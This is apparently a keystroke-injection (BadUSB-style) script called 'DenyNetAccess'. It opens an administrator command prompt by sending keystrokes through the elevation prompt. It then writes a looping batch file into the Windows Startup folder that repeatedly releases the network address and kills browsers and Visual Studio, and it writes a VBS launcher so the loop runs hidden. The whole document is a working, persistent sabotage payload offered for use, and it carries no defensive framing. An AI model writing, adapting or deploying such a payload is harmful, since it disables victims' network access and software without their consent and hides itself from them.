layout('es');                   // Spanish keyboard layout
typingSpeed(100,150)    // Wait 100ms between key strokes + an additional random value between 0ms and 150ms (natural)

// Author:ernest and isaac
// A new DenyNetAccess program that employs window hiding techniques.
press("GUI r")
delay(100)
type("cmd.exe")
delay(100)
// Run CMD as administrator
press("CONTROL SHIFT ENTER")
delay(100)
// Press twice the combination of keys GUI+TAB in order to select the window that allows us to connect as administrator
press("GUI TAB")
delay(100)
press("GUI TAB")
delay(100)
// Press the right arrow so that it is sure that we are in the "part" where you can accept or decline
press("RIGHT_ARROW")
delay(100)
// Press left arrow to accept connecting as root
press("LEFT_ARROW")
delay(100)
press("ENTER")
delay(100)

// A Different directory in case the second one is inaccessable
delay(750)
type("cd %userprofile%\Downloads\")
press("ENTER")
type("cd C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\")
press("ENTER")
// Delete batch file if already exists
type("erase /Q a.bat")
press("ENTER")
// Make the batch file
type("copy con a.bat")
press("ENTER")
type("@echo off")
press("ENTER")
type(":Start")
press("ENTER")
// Release Networking INformation
type("ipconfig /release")
press("ENTER")
// 2 Generic Browsers
type("taskkill /f /im "iexplore.exe"")
press("ENTER")
type("taskkill /f /im "firefox.exe"")
press("ENTER")
// Microsoft Visual Studio 2010
type("taskkill /f /im "devenv.exe"")
press("ENTER")
type("timeout /t 60")
press("ENTER")
type("Goto Start")
press("ENTER")
press("ENTER")
// MAKE THE VBS FILE THAT ALLOWS RUNNING INVISIBLY.
// Delete vbs file if already exists
type("erase /Q invis.vbs")
press("ENTER")
// FROM: http://stackoverflow.com/questions/289498/running-batch-file-in-background-when-windows-boots-up
type("copy con invis.vbs")
press("ENTER")
type("CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False")
press("ENTER")
press("ENTER")
// RUN THE BATCH FILE
type("wscript.exe invis.vbs a.bat")
press("ENTER")
// Close the cmd prompt.
type("EXIT")
